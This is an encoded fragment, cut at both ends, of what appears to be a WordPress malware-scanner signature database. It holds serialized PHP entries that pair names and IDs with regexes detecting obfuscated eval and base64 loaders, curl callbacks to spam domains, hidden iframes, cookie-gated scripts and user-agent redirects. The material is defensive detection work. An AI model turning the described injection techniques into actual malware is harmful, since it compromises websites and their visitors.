JlYXRlX2Z1bmN=aW9uKSkqW1wpXHNceztcfV=qKStcKC4qP1tcKVxzXH=7XSspKyhlY2hvW147XSs7XHMqfFwvXCpbXlwqXSooXCpbXlwqXC9dKikrXC9ccyopKihcPz4oLiskKT98JHw8XC9zY3JpcHQ-KS9pIjt9czo=MToicGhwIHZhciBleHBsb2RlIG51bWJlcnMgVmFyaWFibGUgZnVuY3Rpb24iO2E6Mjp7aTowO3M6NToiSDI=RmwiO2k6MTtzOjIxODoiLzxcP1twaFxzXSsoaWZccypcKChbXlx7XStbXHtcc1=qXCRHTE9CQUxTW1x7XFtdWyciXVxceFteO1=rO1tcfVxzXSopKyhcPz5ccyo8XD9bcGhcc1=rKSk_XCRbYS16XzAtOV=rXHMqPVxzKignLis_J3wiLis_Iik7XHMqLio_XHMqXCRbYS16XzAtOV=rXHMqPVxzKmV4cGxvZGVcKFteLF=rWywiJ1wuMC=5XHNdK1wpO1xzKi4qP1wkW2Etel8wLTldK1xzKlwoLio_XD8-KC4rJCk_L2kiO31zOjkzOiJmdW5jdGlvbiBYIGlmIGZ1bmN=aW9uX2V4aXN=cyBjdXJsX2luaXQgc3BhbWNoZWNrci5jb2=gY3VybF9leGVjIGN1cmxfY2xvc2UgZWNobyBhZGRfYWN=aW9uIFgiO2E6Mjp7aTowO3M6NToiRzVMODgiO2k6MTtzOjUzNjoiLyhcL1wqLio_XCpcL1xzKikqKFw_PlxzKjxcP1twaFxzXSopPyhpZlxzKlwoW15ce1=rXHtccypmdW5jdGlvblxzKyhbYS16XzAtOV=rKVwoW15ce1=rXHtccyopP2lmW1xzXChcIV=rZnVuY3Rpb25fZXhpc3RzXChccypbJyJdKFthLXpfMC=5XSspWyciXVtcc1wpXStce1xzKigoZnVuY3Rpb25ccytcNVwoKT8uKz8oc3BhbWNoZWNrclwuY29tfGphdmF=ZXJtMVwucHd8WyciXWpxdWVyeVwuKS4rP2N1cmxfaW5pdC4rP2N1cmxfZXhlYy4rP2N1cmxfY2xvc2VbXjtdK1s7XHNdK2VjaG98ZnVuY3Rpb25ccytcNVxzKlwoW15cKV=qW1wpXHNdK1x7XHMqKFwkW2Etel8wLTldK1xzKj1bXjtdK1s7XHNdKykqKGlmW1xzXChdK1xAPyhcJHxmb3Blbltcc1woXSspW15ce1=rW1x7XHNdKik_ZWNob1wod3BfcmVtb3RlX3JldHJpZXZlX2JvZHlcKHdwX3JlbW9=ZV9nZXRcKClbXjtdKztbXHNcfV=rKGFkZF9hY3Rpb25bXlwsXStcLFxzKlsnIl=oXDV8XDQpWyciXVtcc1wpO1=rXH=pPyhccypcPz5ccyo8XD9bcGhdKik_KFxzKlwvXCouKj9cKlwvKSovaXMiO31zOjk2OiJpZiBmdW5jdGlvbl9leGlzdHMgZnVuY3Rpb24gZXJyb3JfcmVwb3J=aW5nIFZhcmlhYmxlIHhGRiBIKiBpZiBmaWxlX2V4aXN=cyBlcnJvcl9yZXBvcnRpbmcgZW5kaWYiO2E6Mjp7aTowO3M6NToiRTkyR3AiO2k6MTtzOjI3MDoiL2lmWyBcKFwhXStmdW5jdGlvbl9leGlzdHNcKFsgJyJdKyguKz8pWyAnIl=rW1wpIFx=XStcOi4rP2Z1bmN=aW9uIFwxXChcKSBcey4rP2Vycm9yX3JlcG9ydGluZ1woMC4rPyhcJChbYS16MC=5XF9dKylbID1cdF=rIihcXHhbMC1mXXsyfSkrIjtbXHQgXHJcbl=rKFwkKFthLXowLTlcX1=rKVsgPVx=XStcJChbYS16MC=5XF9dKylcKCJIXCoiXCwuKz87W1x=IFxyXG5dKykrKStpZlsgXChcIV=rZmlsZV9leGlzdHMuKz9lcnJvcl9yZXBvcnRpbmdcKFwkLis_ZW5kaWY7L2lzIjt9czoxNzoiaW5jbHVkZSBJbWFnZUZpbGUiO2E6Mjp7aTowO3M6NToiSDEySjEiO2k6MTtzOjI1NjoiLyg_PCFcL1wvXHN7OH=pXEA_KGluY2x1ZGV8cmVxdWlyZSkoX29uY2UpP1tcKFxzXStbYS16XzAtOSxcLidccyJcL1wtXSs_KD88IUdEX1NZU1RFTV9QTFVHSU5fRElSIFwuICdcL2ltYWdlc1wvNDA=KShcLihnaWZ8anBnfHBuZ3xjYnV8Y3NzfFtccyInXStcL3dwLWluY2x1ZGVzXC9pbml=XC5waHB8W1xzIiddK1wvd3AtYWRtaW5cL2luY2x1ZGVzXC9jbGFzcy13cC1pdGVybmFsLXVwZ3JhZGVcLnBocCl8d3AtamF2YVwucGhwKVsiJ1xzXCldKzsvaSI7fXM6NDE6Ii9mdW5jdGlvbiBhcnJheSBWYXJpYWJsZSBGdW5jdGlvbiBpZiBldmFsIjthOjI6e2k6MDtzOjU6IkcyTk5DIjtpOjE7czozNTY6Ii8oXC9cKlteXCpdKihcKlteXCpcL1=qKStcL1xzKikqKChcJFtfXC=-XC5hLXowLTldKylccyo9W147XSs7XHMqKFthLXpfMC=5XSspXChbXlwpXSpcNFteXCldKltcKVxzO1=rXHMqZnVuY3Rpb25ccypcNXxmdW5jdGlvblxzKlthLXpfMC=5XSspXHMqXChbXlx7XStce1xzKihcJFtfXC=-XC5hLXowLTldKylccyooXFtbXlxdXStcXStccyopKj1ccyphcnJheShfbWFwKT9ccypcKC4rP1wpO1xzKihcJFtfXC5hLXowLTlcWyciXF1cc1=rKD1bXjtdKlw2W147XSo7XHMqfFwoLis_aWZbXHNcKF=qXCRbX1wuYS16MC=5XFsnIlxdXHNdK1wpXHMqXHspKStccyoocmV=dXJuXHMqKT9ldmFsXHMqXChbXlwpXStbXClccztcfV=rL2lzIjt9czo=MzoiVGFnZ2VkIGVycm9yX3JlcG9ydGluZyBIVFRQX1VTRVJfQUdFTlQgY3VybCI7YToyOntpOjA7czo1OiJHM=43ZyI7aToxO3M6MjIwOiIvKGVycm9yX3JlcG9ydGluZ1xzKlwoW147XSs7XHMqfFwkW2Etel8wLTldK1xzKj1ccyphcnJheVxzKlwoW15cKV=rXCkrWztcKVxzXSopKmlmXHMqXChbXlwpXStIVFRQX1VTRVJfQUdFTlQoLis_aHR=cDpcL1wvfC4rP2N1cmxfaW5pdCl7Mix9Lis_KFwkW2Etel8wLTldKyk_W1xzPV=qY3VybF9leGVjLis_KHByaW5=fGRpZXxlY2hvKVsnIlxzXChdK1wzWyciXHNcKTtcfV=rXHMqL2lzIjt9czozMDoiaGVhZGVyIExvY2F=aW9uIGh=dHAgc3BhY2UucGhwIjthOjI6e2k6MDtzOjU6IkU5OURwIjtpOjE7czo2MzoiL2hlYWRlclwoWyciXUxvY2F=aW9uOiBodHRwOlwvXC9bXlwvXStcL3NwYWNlXC5waHBcP1teXCldK1wpOy9pIjt9czo1MDoiQ29weXJpZ2h=IGZ1bmN=aW9uIGdldENvb2tpZSBkb2N1bWVudC53cml=ZSBpZnJhbWUiO2E6Mjp7aTowO3M6NToiRjlVQXgiO2k6MTtzOjkxOiIvKFwvXCouKz9cKlwvKVxzKmZ1bmN=aW9uXHMrKFthLXpfMC=5XSspXCguKz9uYXZpZ2F=b3JcLnVzZXJBZ2VudC4rPzxpZnJhbWUgLis_XDJcKC4rP1wxL2lzIjt9czozNzoiQ29weXJpZ2h=IGZ1bmN=aW9uIHNldENvb2tpZSBmdW5jdGlvbiI7YToyOntpOjA7czo1OiJGMUNGbyI7aToxO3M6MTk3OiIvXC9cKlxzKkNvcHlyaWdodC4rXHMqXCpcL1xzKihmdW5jdGlvbiBbc2ddZXRDb29raWVcKC4rP3JldHVyblteO1=qWztcfVxzXSspKmZ1bmN=aW9uIChbYS16MC=5XF9dKylcKFwpW1x7XHNdKyhbYS16MC=5XHNcPV=rbmF2aWdhdG9yXC51c2VyQWdlbnQuKz98ZnVuY3Rpb25ccyspW3NnXWV=Q29va2llXCguKz9cMlwoW147XStbO1x9XHNdKy9pcyI7fXM6MjE6InBocCBoZXgtZW5jb2RlZC1saW5lcyI7YToyOntpOjA7czo1OiJGMTRIayI7aToxO3M6NjA6Ii88XD9bcGhcc1=rKFteO1=qXHhbMC=5YS1mXXsyfVteO1=qWztcc1=rKXs5LH=uKlxzKihcPz58JCkvaSI7fXM6MzU6InBocCBhcnJheSBodHRwIG1=X3JhbmQgbWV=YSByZWZyZXNoIjthOjI6e2k6MDtzOjU6IkVBMkR2IjtpOjE7czoyMDM6Ii88XD8ocGhwKT9bXHJcbiBcdF=qXCRbYS16XF8wLTldK1tcdCA9XSthcnJheVsgXChcclxuXHRdKyhbJyJdaHR=cC4rWywgXCk7XHJcblx=XSspK1wkW2EtelxfMC=5XStbXHQgPV=rbXRfcmFuZFwoLitbIFwpO1xyXG5cdF=rKFwkW2EtelxfMC=5XStbXHQgPV=rLitbXHJcbiBcdF=qKStcPz5bIFxyXG5cdF=qPG1ldGEgKC4rPzxcPy4rP1w_PikqLio_Pi9pIjt9czo=NDoicGhwIGFycmF5IGZ1bmN=aW9uIHJldHVybiBiYXNlNjRfZGVjb2RlIGV2YWwiO2E6Mjp7aTowO3M6NToiRjdRMEQiO2k6MTtzOjIyNToiLzxcP1twaFxzXStcJFtfXC1cPlwuYS16MC=5XHtcWyciXF1cfV=rXHMqPVxzKmFycmF5XCguKz9mdW5jdGlvblxzKyhbYS16XzAtOV=rKVwoKC4rPztccyopKygoXCRbYS16XzAtOV=rXHMqPVxzKik_KGV2YWx8XCRbYS16XzAtOV=rKFxzKlxbW15cXV=rXF=pKilccypcKFxzKihcJF8oUkVRVUVTfEdFfFBPUylUXFspP1teXCldK1tcKTtcc1=rKGV4aXR8ZGllKVteO1=qO1xzKikrKCR8XD8-KS9pIjt9czo1NjoicGhwIGlmIGlzc2V=IEdMT=JBTFMgc3RydG9sb3dlciBTRVJWRVIgaWYgc3Ryc3RyIEdMT=JBTFMiO2E6Mjp7aTowO3M6NToiRUFBRWQiO2k6MTtzOjI=MToiLzxcP1twaF=qXHMraWZbXChcc1=rXCFpc3NldFtcKFxzXStcJEdMT=JBTFNcWyJcXHhbXlxdXStbXF1cKVxzXHtdKyhcJFthLXpfMC=5XSspW1xzPV=rc3RydG9sb3dlcltcKFxzXStcJF9TRVJWRVJcWyJcXHhbXlxdXStbXF1cKTtcc1=rKChpZnxhbmQpW1woXHNcIV=rc3Ryc3RyW1woXHNdK1wxW1xzLCInXStcXHhbXlwpXStbXClcc1x7XSspK1wkR=xPQkFMU1xbIlxceFteXF1dK1xdW147XSo7W1x9XHNdKyhcPz58JCkvaSI7fXM6NDI6ImZ1bmN=aW9uIHJldHVybiBmdW5jdGlvbiBWYXJpYWJsZSBmdW5jdGlvbiI7YToyOntpOjA7czo1OiJFQUtBQiI7aToxO3M6MjAyOiIvKGZ1bmN=aW9uW2Etel8wLTlcc1=rXChbXlwpXSpbXClcc1=rXHtccypyZXR1cm5bYS16XzAtOVxzXStcKFteXCldKltcKVxzXSs7Klx9K1xzKikrKFwkW2Etel8wLTldK1s9XHNdKyhbYS16XzAtOVxzXStcKFteXCldKltcKVxzXSt8WyciXVteO1=qKTsrXHMqKSsoXCRbYS16XzAtOV=rKVs9XHNdK1teO1=rWyciXCk7XStccypcNFxzKlwoKy4qP1wpOy9pIjt9czoxNzoiZXZhbCBjaHIgUkVQRUFURUQiO2E6Mjp7aTowO3M6NToiRzVCTmEiO2k6MTtzOjIxMjoiLyg8XD9bcGhdKnxcL1wqW15cKl=qXCpcLylccyooKFwkW2Etel8wLTldKylccyo9XHMqJyk_KC4rP1wuXHMqY2hyXChbMC=5XStcKVxzKlwuKXsyMH=uK1xzKihcM1xzKj1ccypzdHJfcmVwbGFjZVwoJ1wjWycsXHNdK1wzXCk7XHMqKT8oKFwkW2Etel8wLTldKylccyo9XHMqY3JlYXRlX2Z1bmN=aW9uXChbJ1xzLF=qXDNcKTtccypcN1woXCk7KT8oXD8-XHMqfCR8XDEpL2kiO31zOjM2OiJnYXJiYWdlIGFyb3VuZCBldmFsIFZlcmlhYmxlRnVuY3Rpb24iO2E6Mjp7aTowO3M6NToiRzVONmIiO2k6MTtzOjI=ODoiLzxcP1twaFxzXSsoXCRbYS16XzAtOV=rW1xzXC5dKj=oW1xzXC5dKigoWyInXSkuKz8oPzwhX2UpXDR8XC9cKlteXCpdKihcKlteXCpcL1=qKStcL3xcJFtcJFx7XSpbYS16XzAtOV=qW1x9XHNdKihcW1teXF1dK1xdK1xzKikqKSkrO1xzKikrKChldmFsfGlmKVxzKlwoKT9cJFtcJFx7XSpbYS16XzAtOV=rW1x9XHNdKihcW1teXF1dK1xdW1xzXSopKlwoLio_KC4rJ1tcLjtcKV=rKT8oXHMqJy4rJ1tcLjtcKV=rKSpccyooXD8-fCQpL2kiO31zOjU2OiJpZiBkZWZpbmVkIGRlZmluZSBmdW5jdGlvbiBnbG9iYWwgZXZhbCBWYXJpYWJsZSBGdW5jdGlvbiI7YToyOntpOjA7czo1OiJHMUhMZiI7aToxO3M6MTk3OiIvaWZbXChcc1=rXCFkZWZpbmVkXChbXlwpXStbXClcc1=rXHtccypkZWZpbmVcKFteXCldK1tcKVxzXSs7XHMqZnVuY3Rpb25bXlwoXSpcKFteXCldKltcKVxzXStce1xzKmdsb2JhbCAoXCRbXjtdKyk7XHMqKC4rP1xzKikrZXZhbFwoXDEoXFtbXlxdXStcXVxzKikqXChbXlwpXSpbXClcc1=rOyhccypyZXR1cm5bXjtdKjspP1xzKlx9XHMqXH=vaSI7fXM6MjU6ImlmcmFtZSBzbWFsbCBoZWlnaHR8d2lkdGgiO2E6Mjp7aTowO3M6NToiRzNTOGYiO2k6MTtzOjE1MzoiLyg8c2NyaXB=W14-XStzcmM9WyciXT9odHRwXDpcL1wvKFthLXpcLlwtMC=5XSspW14-XSo-PFwvc2NyaXB=Pik_PGlmcmFtZS4qPyhccyooaGVpZ2h=fHdpZHRofHNyYyk9WyciXT8oWzAtNV1bJyJcc118aHR=cFw6XC9cLy4rPykpezN9W14-XSo-PFwvaWZyYW1lPi9pIjt9czo=OToicGhwIGdsb2JhbCBhcnJheSBmdW5jdGlvbl9leGlzdHMgcmV=dXJuIGZvciB1bnNldCI7YToyOntpOjA7czo1OiJFQzgxTyI7aToxO3M6MjYxOiIvZ2xvYmFsIChcJFthLXowLTlcX1=rKTtccypcMVtccz1dK2FycmF5XCguKz9mdW5jdGlvbl9leGlzdHNcKFteXCldK1tcKVxzXCZdK1whZnVuY3Rpb25fZXhpc3RzXChbJyJdKFthLXowLTlcX1=rKVsnIl1bXClcc1x7XStmdW5jdGlvblxzK1wyXChbXlwpXStbXClcc1x7XStnbG9iYWwgXDE7Lis_cmV=dXJuW147XSpbO1xzXH1dK2ZvclxzKlwoW15cKV=qW1wpO1x9XSsoXHtccypbXCRhLXowLTlcX1=rXChbXlwpXStbXCk7XH1dKyk_dW5zZXRcKFwxXCk7L2kiO31zOjEzOiJldmFsIHBhY2sgSGV4IjthOjI6e2k6MDtzOjU6IkY4VERvIjtpOjE7czozMjU6Ii8oXC9cKi4qP1wqXC9ccyp8XCRbYS16XzAtOVxbJyJcXVxzXSs9XHMqKFsnIl=pLio_XDI7XHMqKSooaWZbXHNcKFwhXStmdW5jdGlvbl9leGlzdHNbXChcc1=rKFsnIl=pKFthLXpfMC=5XSspXDRbXClcc1=rXHtccyopPyhmdW5jdGlvblxzKyhbYS16XzAtOV=rKVwoW15cKV=qW1wpXHNdK1x7W15cfV=rcGFja1woWyciXUhcKlsnIixcc1wuMC=5QS1GXStbXCk7XHNdK3JldHVyblteO1=qWztcc1=rXH1bO1xzXSspP2V2YWxcKChcNVwoW15cKV=qW1wpO1xzXH1dK3xcN1woW15cKV=qW1wpO1xzXSt8cGFja1woWyciXUhcKlsnIixcc1wuMC=5QS1GXStbXCk7XHNdKykvaXMiO31zOjQ3OiJwaHAgSFRUUF9VU=VSX=FHRU5UIGlmIGhlYWRlciBMb2NhdGlvbiBodHRwIC5ydSI7YToyOntpOjA7czo1OiJHMzFMUiI7aToxO3M6MzEwOiIvPFw_W3BoXHNdKihcJFthLXpfMC=5XSspXHMqPVxzKihhcnJheVwoW15cKV=rXC5ydVsnIl1cKSs7XHMqKFwkW2Etel8wLTldKylccyo9XHMqXDFcWy4rO1xzKihcJFthLXpfMC=5XSspXHMqPVtcc1woXSpwcmVnX21hdGNoXHMqfFwkX1NFUlZFUlxbWyInXUhUVFBfVVNFUl9BR=VOVFsnIl1cXTtccyppZltcc1woXStbXCRhLXpfMC=5XSspXCguKihcM3xcMSkuKltcKVxzXHtdK2hlYWRlclwoWyciXUxvY2F=aW9uOlxzKihodHRwOlwvXC8uK1wucnVcLy4qfFsnIlwuXHNdK3xcMXxcM3xcNCkrXCk7W1xzZGllXChcKTtcfV=qKFw_PlxzKnwkKS9pIjt9czo4NDoicmVxdWlyZV9vbmNlIHdwLXVwZGF=ZS5waHAgUkVNT1RFX=FERFIgSFRUUF9VU=VSX=FHRU5UIHJlcXVpcmVfb25jZSB3cC1jbGFzcy5waHAgZGllIjthOjI6e2k6MDtzOjU6IkYzS=dyIjtpOjE7czoxOTY6Ii88XD8uKz9yZXF1aXJlX29uY2VbXHNcKCInXSt3cC11cGRhdGVcLnBocFsiJ1wpO1xzXStcJGlwID=gXCRfU=VSVkVSXFtbIiddUkVNT1RFX=FERFJbIiddXF=7Lis_XCRfU=VSVkVSXFtbIiddSFRUUF9VU=VSX=FHRU5UWyInXVxdLis_cmVxdWlyZV9vbmNlW1xzXCgiJ1=rd3AtY2xhc3NcLnBocFsiJ1wpO1xzXStkaWVcKC4rPygkfFw_PikvaXMiO31zOjM2OiJldmFsIGRlY29kZVVSSUNvbXBvbmVudCBFbmNvZGVkLXRleHQiO2E6Mjp7aTowO3M6NToiRjExNGciO2k6MTtzOjExNToiLyhcL1wqXHMqaHR=cDpcL1wvd3d3LkpTT=4ub3JnXC9qc29uMlwuanMuKz8pP2V2YWxbXHNcKF=rZGVjb2RlVVJJQ29tcG9uZW5=W1xzXChdK1siJ11cJVtcJTAtOWEtel=rWyciXVtcKTtcc1=rOy9pcyI7fXM6ODY6ImZ1bmN=aW9ucyBCRE4gU1ZCIFNDayBHQ2sgaWYgY29va2llRW5hYmxlZCBHQ2sgZWxzZSBTQ2sgaWYgbG9hZGVkIFNWQiBhZGRFdmVudExpc3RlbmVyIjthOjI6e2k6MDtzOjU6IkVDRkdaIjtpOjE7czo=MzA6Ii9mdW5jdGlvbiBCRE5cKC4rP2Z1bmN=aW9uIFNWQlwoLis_ZnVuY3Rpb24gU=NrXCguKz9mdW5jdGlvbiBHQ2tcKC4rP3JldHVybiB1bmVzY2FwZVwoZG9jdW1lbnRcLmNvb2tpZVwuc3Vic3RyaW5nXChbXlwpXStbXCk7XHNcfV=raWZbXHNcKF=rbmF2aWdhdG9yXC5jb29raWVFbmFibGVkW1wpXHNce1=raWZbXHNcKFwhXStHQ2tcKFteXHtdK1x7W1x9ZWxzZVx7XHNdKlNDa1woW15cKV=rW1wpO1xzXStpZltcc1woXStkb2N1bWVudFwubG9hZGVkW1wpXHtcc1=rU1ZCXChbXlwpXSpbXCk7XHNcfV=rZWxzZVtce1xzXStpZltcc1woXSt3aW5kb3dcLmFkZEV2ZW5=TGlzdGVuZXJbXClce1xzXSt3aW5kb3dcLmFkZEV2ZW5=TGlzdGVuZXJcKFteXCldK1tcKTtcc1x9XStlbHNlW1x7XHNdK3dpbmRvd1wuYXR=YWNoRXZlbnRcKFteXCldK1tcKTtcc1x9XSsvaXMiO31zOjE4OiJkaXYgc3R5bGUgb3BhY2l=eTAiO2E6Mjp7aTowO3M6NToiRjM4SU=iO2k6MTtzOjkzOiIvXHMqPGRpdiBzdHlsZT1bJyJdW14-XSpvcGFjaXR5XHMqLlxzKjAoW15cLl18XC5bMC=xXSlbXj5dKj5ccyooPGEgLis_PFwvYT5ccyopKy4rPzxcL2Rpdj4vaXMiO31zOjQ=OiJwaHAgZXJyb3JfcmVwb3J=aW5nIExvbmcgbWFpbCBwcmludF9yIFNFUlZFUiI7YToyOntpOjA7czo1OiJIMjJNRiI7aToxO3M6MzE1OiIvPFw_W3BoXHNdKihlcnJvcl9yZXBvcnRpbmdcKC57OTk5OSx9fChcJFthLXpfMC=5XStccyo9XHMqKDF8XCRfKFJFUVVFU3xHRXxQT1MpVChccypcW1teXF1dK1xdKykrKTtccyopKyhpZlxzKlwoW15cKV=rW1wpXHNce1=rZGllW1xzXChdK1teO1=rO1tcc1x9XSopK2lmXHMqXChbXlwpXStbXClcc1x7XSt3aGlsZVxzKlwoW15cKV=rW1wpXHNce1=rKW1haWxccypcKC4rKHByaW5=X3JcKFwkX1NFUlZFUi4rfFxzKmVjaG8uK1xzKlwkW2Etel8wLTlcKztdK1tcfVxzXSopKFw_PigoXHMqW1xbPF1odG1sW1xdPl=pezJ9W14kXSs8XC9odG1sPik_fCQpL2kiO31zOjY3OiJpZiAhZnVuY3Rpb25fZXhpc3RzIGZ1bmN=aW9uIGN1cmwgcmV=dXJuIGZ1bmN=aW9uIGluY2x1ZGUgZnVuY3Rpb25zIjthOjI6e2k6MDtzOjU6IkVDTTI=IjtpOjE7czoyODc6Ii9pZlxzKlwoXHMqXCFmdW5jdGlvbl9leGlzdHNcKFsiJ1=oW2Etel8wLTldKylbJyJdXClbXClcc1x7XSpmdW5jdGlvblxzKlwxXChbXlwpXStcKVtcKVxzXHtdKyhbXlxuXSpjdXJsX1teXG5dK1xzKykrcmV=dXJuW15cbl=rW1xzK1x9XStmdW5jdGlvblxzKlthLXpfMC=5XStcKFteXCldKlwpW1wpXHNce1=rKChcJFthLXpfMC=5XSspXHMqPVxzKihbYS16XzAtOV=rKVwoW15cbl=rXHMrKStpbmNsdWRlW1woXHNdK1w=Lis_ZnVuY3Rpb25ccytcNS4rPygkfCg_PWZ1bmN=aW9uICl8KD89XD9cPikpL2lzIjt9czo1OToiaWYgIWN1cnJlbnRfdXNlcl9jYW4gYWRkX2ZpbHRlciBmdW5jdGlvbiBhIGhyZWYgaHR=cCByZXR1cm4iO2E6Mjp7aTowO3M6NToiRUNNM1IiO2k6MTtzOjI2NToiL2lmXHMqXChccypcIWN1cnJlbnRfdXNlcl9jYW5cKFteXCldK1tcKVxzXHtdKmFkZF9maWx=ZXJbXHMqXChdK1teLF=rLFxzKlsiJ1=oW2Etel8wLTldKylbJyJdXClbXCk7XHNcfV=rZnVuY3Rpb25ccypcMVwoLis_YWRkX2ZpbHRlcltccypcKF=rW14sXSssXHMqWyInXShbYS16XzAtOV=rKVsnIl1cKVtcKTtcc1x9XSsuK3JldHVyblteO1=qWztcc1x9XStmdW5jdGlvblxzKlwyXCguKz88YSBocmVmPVsnIl1odHRwOlwvXC8uK3JldHVyblteO1=qWztcc1x9XSsvaSI7fXM6NTk6InBocCBBcnJheSBmdW5jdGlvbiByZXR1cm4gYmFzZTY=X2RlY29kZSBldmFsIEZ1bmN=aW9uIEFycmF5IjthOjI6e2k6MDtzOjU6IkVDTjV=IjtpOjE7czoxODM6Ii88XD9bcGhcc1=rKFwkW2EtelxfMC=5XStccyo9W147XStbO1xzXSspKihcJFtcJFx7XSpbYS16XF8wLTldK1x9KihccypcW1teXF1dK1xdKSopXHMqPVxzKmFycmF5Lis_ZnVuY3Rpb24gKFthLXpcXzAtOV=rKS4rP3JldHVybiBiYXNlNjRfZGVjb2RlLis_ZXZhbFwoXHMqXDRbXjtdK1wyW147XStbO1xzXH1cPz5dKy9pcyI7fXM6Mzg6InBocCBWYXIgQXJyYXkgQ29uY2F=IFZhcmlhYmxlIEZ1bmN=aW9uIjthOjI6e2k6MDtzOjU6Ikc1TjdPIjtpOjE7czoyMzU6Ii88XD9bcGhcc1=rKFwvXC8uKltcc1=rKSooKFwkW2Etel8wLTldKylccyo9XHMqKCgnW14nXSooPzwhX2UpJ3wiW14iXSoifFwkW2Etel8wLTldKylbXHNcLl=qKStbXjtdKjtccyopKz8oXEA_XCQoW1wkXHtdKlthLXpfMC=5XStcfSooXHMqXFtbXlxdXStcXSkqXHMqPVtcc1xAP1wkXHtdKlwkKT9bXCRce1=qW2Etel8wLTldK1x9KihccypcW1teXF1dK1xdKSpccypcKFteO1=rO1xzKikrLipccyooJHxcPz4pL2kiO31zOjYzOiJwaHAgYXJyYXkgaW1wbG9kZSBmdW5jdGlvbiBWYXIgSGV4IHJldHVybiBWYXJpYWJsZUZ1bmN=aW9uIGV2YWwiO2E6Mjp7aTowO3M6NToiRUNQRDIiO2k6MTtzOjI4NDoiLzxcP1twaFxzXSsoXCRbYS16XF8wLTldKylccyo9XHMqYXJyYXlbXjtdK1s7XHNdKy4rPyhcJFthLXpcXzAtOV=rKVxzKj1ccyppbXBsb2RlW147XStcMVteO1=rWztcc1=rZnVuY3Rpb24gKFthLXpcXzAtOV=rKVwoW15cKV=rW1wpXHtcc1=rKFwkW2EtelxfMC=5XStccyo9W1xzJyJdKyhcXHhbMC=5YS1mXXsyfSkrWyciXTtccyopK3JldHVyblteO1=rP1wkW2EtelxfMC=5XSsoXHMqXFtbXlxdXStcXSkqXChbXjtdK1s7XH1cc1=rZXZhbFwoXDNcKFxzKlwyW147XStbO1xzXSsuKz8oJHxcPz4pL2kiO31zOjU4OiJwaHAgYXJyYXkgaWYgU=VSVkVSIGlmIGlzYm9=IGZpbGVfZ2V=X2NvbnRlbnRzIGhlYWRlciBodHRwIjthOjI6e2k6MDtzOjU6IkZBVkY5IjtpOjE7czoyOTg6Ii88XD9bcGhcc1=rKChlcnJvcl9yZXBvcnRpbmd8aW5pX3NldClccypcKFteO1=qO1xzKikqKFwkW2EtelxfMC=5XStccyo9W147XStbO1xzXSspKyhpZlteO1=rXCRpc2JvdFteO1=rWztcfVxzXSspKyguKz8oXCRbYS16XzAtOV=rKVxzKj1ccyooZmlsZV9nZXRfY29udGVudHN8Y3VybF9leGVjKVxzKlwoW15cfV=rW1x9XHNdKykrKChcJFthLXpcXzAtOV=rKVxzKj1bXjtdKlw2W147XSpbO1xzXSspKi4rKChcNnxcOSlbXjtdK1s7XH1cc1=rKChoZWFkZXJ8ZWNob3xwcmludClbXjtdK1s7XH1cc1=rKSspKygkfFw_PikvaXMiO31zOjQzOiJwaHAgUkVRVUVTVCBhcnJheSBSRVFVRVNUIGFycmF5X2ZpbHRlciBleGl=IjthOjI6e2k6MDtzOjU6IkVDUUNwIjtpOjE7czoxOTY6Ii88XD9bcGhcc1=rKFwkW2EtelxfMC=5XSspXHMqPVxzKlwkXyhSRVFVRVN8R=V8UE9TKVRcW1teO1=rWztcc1=rKFwkW2EtelxfMC=5XSspXHMqPVxzKmFycmF5XChcJF8oUkVRVUVTfEdFfFBPUylUXFtbXjtdK1s7XHNdK1wkW2EtelxfMC=5XStccyo9XHMqYXJyYXlfZmlsdGVyXChcM1ssXHNdKlwxXClbZGV4aXRcKFwpO1xzXSooJHxcPz4pL2kiO31zOjUwOiJwaHAgYmFzZTY=X2RlY29kZSBjcmVhdGVfZnVuY3Rpb24gVmFyaWFibGVGaW5jdGlvbiI7YToyOntpOjA7czo1OiJGOEJKOCI7aToxO3M6MjU=OiIvPFw_Lis_KFwkW2Etel8wLTldKylccyo9XHMqYmFzZTY=X2RlY29kZVwoLis_KChcJFthLXpfMC=5XSspXHMqPVxzKihcQD8oZ3ppbmZsYXRlfHN=cnJldilcKCkrXDEuKz8pPyhcJFthLXpfMC=5XSspXHMqPVxzKmNyZWF=ZV9mdW5jdGlvblwoW14sXStbLFxzXSsoXDF8XDMpW147XStbO1xzXStcNlwoW147XStbO1xzXH1dKyhlbHNlW1x7XHNdK1teXH1dK1s7XHNcfV=rfGVjaG9bXHNcKF=qKFsnIl=pLis_XDlbO1xzXH1dKykqKCR8XD8-KS9pcyI7fXM6NDc6InBocCBmdW5jdGlvbiB3cF9lbnF1ZXVlX3NjcmlwdCBqc29uMiBhZGRfYWN=aW9uIjthOjI6e2k6MDtzOjU6IkZCQTdRIjtpOjE7czozOTU6Ii8oXC9cKlteXCpdKihcKlteXCpcL1=qKStcL1xzKikqKGlmW1xzXChcIV=rZnVuY3Rpb25fZXhpc3RzXChccypbJyJdKFthLXpfMC=5XSspWyciXVtcc1wpXStce1xzKik_ZnVuY3Rpb25ccysoW2Etel8wLTldKylccypcKFteXHtdK1x7XHMqKChpZltcc1woXCFdK2lzc2V=W1woXHNdK1teXCldK1tcc1wpXStbXHtcc1=qKT8oXCRbYS16XzAtOV=rXHMqPVteO1=rO1xzKikqKFwkW2Etel8wLTldK1xzKj1ccyopP1wkW2Etel8wLTldK1xzKlwoLio_YmFzZTY=X2RlY29kZVwofChlY2hvfHByaW5=KVtcc1woJyJdKzxzY3JpcHQuKz9mcm9tQ2hhckNvZGVcKC4rP2RvY3VtZW5=XC53cml=ZVwoKS4rP2FkZF9hY3Rpb25ccypcKFtccyInXSpbXixdK1snIlwsXHNdKyhcNHxcNSlbJyJcKTtcc1=rL2lzIjt9czo2MToicGhwIGlmIGZ1bmN=aW9uX2V4aXN=cyBmdW5jdGlvbiByZXR1cm4gVmFyaWFibGUgRnVuY3Rpb24gZXZhbCI7YToyOntpOjA7czo1OiJGOEY2dyI7aToxO3M6MTk2OiIvPFw_W3BoXHNdKigoXC9cKi4rP1wqXC9ccyopKihcJFthLXpcXzAtOV=rKFxbW15cXV=rW1xdXHNcfV=rKSo9W147XStbO1xzXSspKyhpZltcc1woXStcIWZ1bmN=aW9uX2V4aXN=c1woW15ce1=rW1x7XHNdK2Z1bmN=aW9uIFteXHtdK1tce1xzXSsocmV=dXJuIFwkW2EtelxfMC=5XSt8ZXZhbClcKFteO1=rWztcfVxzXSspKykrKCR8XD8-KS9pIjt9czo=MzoiTGVmdG92ZXIgSGVhZGVyIGlmIEdMT=JBTFMgSGV4IFNFUlZFUiBIZXgvaSI7YToyOntpOjA7czo1OiJGMTZEZyI7aToxO3M6MTg4OiIvPFw_W3BoXHNdK2lmXHM